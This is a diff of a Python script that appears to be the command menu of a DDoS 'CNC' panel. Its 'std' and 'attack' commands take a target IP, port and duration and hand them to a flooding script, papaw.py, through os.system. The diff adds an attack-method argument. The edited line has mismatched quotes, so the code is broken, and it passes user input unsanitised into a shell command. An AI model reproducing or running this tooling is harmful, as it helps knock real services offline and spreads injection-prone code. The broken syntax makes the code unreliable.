@@ -327,15 +327,16 @@ def main():
                 print('Usage: std <ip> <port>')
                 print('Example: std 1.1.1.1 80')
 
-        elif "joker" in cnc:
+        elif "attack' in cnc:
             try:
                 ip = cnc.split()[1]
                 port = cnc.split()[2]
                 time = cnc.split()[3]
-                os.system(f'python3 papaw.py {ip} {port} {time}')
+                methods = cnc.split()[4]
+                os.system(f'python3 papaw.py {ip} {port} {time} {methods}')
             except IndexError:
-                print('Usage: attack <ip> <port> <time>')
-                print('Example: attack 1.1.1.1 80 60')
+                print('Usage: attack <ip> <port> <time> {methods}')
+                print('Example: attack 1.1.1.1 80 60 joker')
 
         elif "etek" in cnc:
             try:
